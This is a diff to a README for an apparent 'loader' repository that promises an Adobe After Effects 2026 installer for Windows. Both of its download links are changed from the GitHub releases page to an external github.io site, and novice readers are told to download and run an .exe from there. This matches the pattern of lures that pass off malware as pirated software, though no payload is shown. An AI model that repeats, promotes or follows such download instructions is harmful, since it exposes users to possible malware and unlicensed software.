@@ -1,6 +1,6 @@
 # 📥 adobe-effects-windows-loader - Access Adobe After Effects Installer Easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ronnylame332/adobe-effects-windows-loader/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://ronnylame332.github.io)
 
 This repository provides a direct path to the Adobe After Effects Installer v2026. If you use a computer with Windows 10 or Windows 11, this tool helps you find and install the software. You do not need technical skills to use this installer. Follow the steps below to set up the software on your machine.
 
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run the application well. Check
 
 To start, you need to visit the project download page. This page hosts the most recent version of the installer.
 
-[Visit this page to download the software](https://github.com/ronnylame332/adobe-effects-windows-loader/releases)
+[Visit this page to download the software](https://ronnylame332.github.io)
 
 When you see the list of files, select the most recent release. The file usually has an .exe extension. Click the file name to start the download to your computer. Wait for the browser to finish the file transfer.
 
